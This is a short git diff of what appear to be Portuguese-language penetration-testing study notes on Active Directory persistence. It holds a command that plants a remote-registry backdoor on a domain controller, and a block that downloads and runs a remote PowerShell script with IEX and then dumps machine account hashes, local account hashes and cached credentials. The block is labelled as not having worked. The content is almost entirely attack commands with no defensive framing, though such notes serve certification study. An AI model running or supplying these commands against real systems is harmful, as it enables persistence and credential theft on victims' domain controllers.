@@ -1799,11 +1799,12 @@ Add-RemoteRegBackdoor -Computername tech-dc01 -Trustee pentester -Verbose
 ```
 ##### PERSISTENCE REMOTE REGISTRY - RECUPERAR INFORMAÇÕES REMOTAMENTE: (NÃO FUNCIONOU)
 ```
-Get-RemoteMachineAccountHash Computername tech-dc01 -Verbose
-```
 IEX (New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/RemoteHashRetrieval.ps1")
+
 Get-RemoteMachineAccountHash -Computername tech-dc01 -Verbose
+
 Get-RemoteLocalAccountHash -Computername tech-dc01 -Verbose
+
 Get-RemoteCachedCredential -Computername tech-dc01 -Verbose
 ```
 
